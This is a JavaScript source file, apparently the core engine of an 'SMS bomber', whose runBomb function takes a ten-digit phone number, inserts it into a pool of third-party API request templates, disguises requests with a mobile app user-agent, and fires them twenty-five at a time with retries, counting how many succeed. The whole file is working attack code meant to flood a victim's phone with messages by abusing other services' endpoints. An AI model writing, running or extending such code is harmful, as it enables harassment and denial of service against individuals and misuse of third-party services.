import { request } from 'undici';
import { poolForMode } from './apis.js';

const CONCURRENCY = 25;
const PER_REQ_TIMEOUT_MS = 6000;
const RETRIES = 1;

function sub(str, phone10) { return str.replaceAll('{phone10}', phone10); }

function deepSub(obj, phone10) {
  if (obj == null) return obj;
  if (typeof obj === 'string') return sub(obj, phone10);
  if (Array.isArray(obj)) return obj.map(v => deepSub(v, phone10));
  if (typeof obj === 'object') {
    const out = {};
    for (const [k, v] of Object.entries(obj)) out[k] = deepSub(v, phone10);
    return out;
  }
  return obj;
}

function buildRequest(api, phone10) {
  const url = sub(api.url, phone10);
  const method = api.method || (api.body ? 'POST' : 'GET');
  const headers = { 'user-agent': 'okhttp/4.9.2', ...(api.headers || {}) };
  let body;
  if (api.body && method !== 'GET') {
    const payload = deepSub(api.body, phone10);
    if (api.json !== false) {
      headers['content-type'] = 'application/json';
      body = JSON.stringify(payload);
    } else {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      body = new URLSearchParams(payload).toString();
    }
  }
  return { url, method, headers, body };
}

async function fireOne(api, phone10) {
  for (let attempt = 0; attempt <= RETRIES; attempt++) {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), PER_REQ_TIMEOUT_MS);
    try {
      const { url, method, headers, body } = buildRequest(api, phone10);
      const res = await request(url, { method, headers, body, signal: ctrl.signal });
      await res.body.dump();
      clearTimeout(timer);
      return { name: api.name, status: res.statusCode, ok: res.statusCode >= 200 && res.statusCode < 400 };
    } catch (err) {
      clearTimeout(timer);
      if (attempt === RETRIES) return { name: api.name, status: 0, ok: false, error: err.code || err.message };
    }
  }
}

export async function runBomb({ phone10, mode, maxApis }) {
  if (!/^\d{10}$/.test(phone10)) throw new Error('phone must be 10 digits');
  let pool = poolForMode(mode);
  pool = [...pool].sort(() => Math.random() - 0.5);
  if (maxApis && pool.length > maxApis) pool = pool.slice(0, maxApis);

  const results = [];
  let cursor = 0;

  async function worker() {
    while (cursor < pool.length) {
      const idx = cursor++;
      results.push(await fireOne(pool[idx], phone10));
    }
  }

  const started = Date.now();
  await Promise.all(Array.from({ length: Math.min(CONCURRENCY, pool.length) }, worker));
  const ok = results.filter(r => r.ok).length;
  return {
    phone10, mode, total: results.length, success: ok, failed: results.length - ok,
    duration_ms: Date.now() - started, results,
  };
}